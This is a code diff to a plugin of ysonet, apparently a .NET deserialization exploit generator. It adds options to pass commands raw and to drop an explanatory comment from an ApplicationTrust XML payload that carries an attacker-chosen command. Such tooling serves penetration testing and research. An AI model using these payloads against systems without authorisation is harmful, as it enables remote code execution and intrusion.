@@ -23,6 +23,8 @@ namespace ysonet.Plugins
         static bool test = false;
         static bool minify = false;
         static bool useSimpleType = true;
+        static bool rawcmd = false;
+        static bool noComment = false;
 
         static OptionSet options = new OptionSet()
             {
@@ -30,6 +32,8 @@ namespace ysonet.Plugins
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                 {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
+                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
+                {"no-comment", "Output only the serialized payload, without the explanatory XML comment.", v => noComment = v != null },
             };
 
         public string Name()
@@ -56,12 +60,15 @@ namespace ysonet.Plugins
         {
             InputArgs inputArgs = new InputArgs();
             List<string> extra;
+            // Reset toggles so an in-process prior run cannot leak into this one.
+            noComment = false;
             try
             {
                 extra = options.Parse(args);
                 inputArgs.Cmd = command;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
+                inputArgs.IsRawCmd = rawcmd;
                 inputArgs.Test = test;
             }
             catch (OptionException e)
@@ -72,10 +79,10 @@ namespace ysonet.Plugins
                 throw new Exception(e.Message);
             }
             String payloadValue = "";
-            string payload = @"<ApplicationTrust version=""1"" TrustedToRun=""true"">
-<ExtraInfo Data=""{0}"">
-</ExtraInfo>
-<!--  the following commented tags can be enabled when needed-->
+            // The commented-out <DefaultGrant> block is an optional example the operator
+            // can enable; --no-comment drops it and leaves just the ApplicationTrust XML.
+            string commentBlock = noComment ? "" :
+@"<!--  the following commented tags can be enabled when needed-->
 <!--
 <DefaultGrant>
 <PolicyStatement version=""1"">
@@ -83,7 +90,11 @@ namespace ysonet.Plugins
 </PolicyStatement>
 </DefaultGrant>
 -->
-</ApplicationTrust>
+";
+            string payload = @"<ApplicationTrust version=""1"" TrustedToRun=""true"">
+<ExtraInfo Data=""{0}"">
+</ExtraInfo>
+" + commentBlock + @"</ApplicationTrust>
 ";
             if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
             {
